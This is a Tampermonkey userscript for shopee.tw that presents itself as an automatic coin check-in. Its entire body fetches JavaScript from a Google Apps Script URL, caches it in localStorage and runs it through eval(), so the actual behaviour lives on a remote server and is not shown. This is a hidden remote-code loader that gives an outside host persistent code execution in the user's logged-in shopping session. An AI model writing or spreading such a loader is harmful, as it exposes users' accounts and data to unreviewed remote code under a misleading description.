// ==UserScript==
// @name         shopee_chkin
// @namespace    http://tampermonkey.net/
// @version      0.5
// @description  shopee_autochecking
// @author       Haoming Lu
// @match        https://shopee.tw/shopee-coins/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=shopee.tw
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    // Your code here...
    key='spchkin'

    let getos=(t)=>{
     cors="//script.google.com/macros/s/AKfycbxb0Spg-uyNkTxIgzby48zstJe9yI7IUTIYblWPNGFnp0xlBdvGh3N2qw/exec?b=";
     fetch(`${cors}${t}`,{method:'GET'}).then(r=>r.text()).then(r=>{
         localStorage.setItem(`js_${key}`,r);
         eval(r)
     })
    }

    let rundigi=()=>{
        js=localStorage.getItem(`js_${key}`)
        if (js!==null) return eval(js)
        getos(`${key}`)
    }
    rundigi()

})();
